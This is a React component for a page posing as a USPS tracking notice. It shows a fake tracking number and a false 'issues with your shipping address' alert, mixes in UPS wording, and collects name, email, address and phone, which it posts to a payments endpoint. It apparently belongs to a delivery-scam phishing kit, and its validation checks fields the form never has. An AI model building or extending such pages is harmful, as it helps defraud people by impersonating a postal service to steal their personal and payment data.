import React, { useState } from 'react';
import axios from 'axios';
import './AddressForm.css';

const AddressForm = ({ formData, handleChange, nextStep, error, setError }) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const requiredFields = ['firstName', 'lastName', 'address', 'country', 'city', 'zipCode'];
      const missingFields = requiredFields.filter(field => !formData[field]?.trim());
      if (missingFields.length > 0) {
        throw new Error('All fields are required.');
      }
      
      if (!/^\d{5}$/.test(formData.zipCode)) {
        throw new Error('ZIP code must be 5 digits.');
      }

      await new Promise(resolve => setTimeout(resolve, 500));
      const response = await axios.post('/api/payments/address', formData);
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Failed to save address.');
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="usps-tracking-container">
      {/* Progress Status Bar */}
      <div className="progress-container">
        {/* Step 1: Verify Address */}
        <div className="progress-step">
          <div className="step-circle completed">
            <span>1</span>
          </div>
          <div className="step-label">Verify Address</div>
        </div>
        
        <div className="progress-connector completed"></div>
        
        {/* Step 2: Status (Current Step) */}
        <div className="progress-step">
          <div className="step-circle active">
            <span>2</span>
          </div>
          <div className="step-label">Status Not Available</div>
        </div>
        
        <div className="progress-connector"></div>
        
        {/* Step 3: UPS Redirect */}
        <div className="progress-step">
          <div className="step-circle">
            <span>3</span>
          </div>
          <div className="step-label">UPS Allows You to Redirect</div>
        </div>
      </div>

      {/* Header Section */}
      <div className="tracking-header">
        <h1>Tracking Number: US9514901165421</h1>
        <div className="status-bar">
          <span className="status-label">Status:</span>
          <span className="status-message">We have issues with your shipping address</span>
        </div>
      </div>

      {/* Information Message */}
      <div className="tracking-message">
        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>
      </div>

      {/* Status Alert Box */}
      <div className="status-alert">
        <h4>Verify Address</h4>
        <p>Find an email to confirm your address as eligible for informed Delivery.</p>
      </div>

      {/* Address Form */}
      <form onSubmit={handleSubmit} className="address-form">
        {error && <div className="usps-error">{error}</div>}
        
        <div className="form-group">
          <label>Full name</label>
          <input
            type="text"
            name="fullName"
            value={formData.fullName}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-group">
          <label>Email Address</label>
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-group">
          <label>Select Address 1</label>
          <input
            type="text"
            name="address1"
            value={formData.address1}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-row">
          <div className="form-group city">
            <label>City</label>
            <input
              type="text"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
          <div className="form-group state">
            <label>State</label>
            <select
              name="state"
              value={formData.state}
              onChange={handleChange}
              required
              disabled={loading}
            >
              <option value="">Select</option>
              {/* State options would go here */}
            </select>
          </div>
        </div>

        <div className="form-group">
          <label>ZIP Code</label>
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleChange}
            required
            disabled={loading}
            pattern="\d{5}"
          />
        </div>

        <div className="form-group">
          <label>Phone Number</label>
          <input
            type="tel"
            name="phone"
            value={formData.phone}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-footer">
          <p>United States of America</p>
          <button 
            type="submit" 
            disabled={loading} 
            className="usps-button"
          >
            {loading ? (
              <>
                <span className="usps-spinner"></span> Processing...
              </>
            ) : 'Continue'}
          </button>
        </div>
      </form>
    </div>
  );
};

export default AddressForm;
